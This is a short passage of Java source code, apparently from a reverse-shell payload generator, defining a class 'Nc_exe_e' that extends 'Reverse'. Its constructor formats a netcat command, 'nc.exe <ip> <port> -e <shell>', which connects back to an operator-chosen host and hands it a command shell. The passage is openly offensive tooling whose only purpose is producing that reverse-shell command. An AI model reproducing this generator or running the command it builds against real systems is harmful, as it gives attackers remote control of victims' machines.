...
public class Nc_exe_e extends Reverse {

    protected String shellFormat = "";

    public Nc_exe_e(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("nc.exe %s %s -e %s", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }
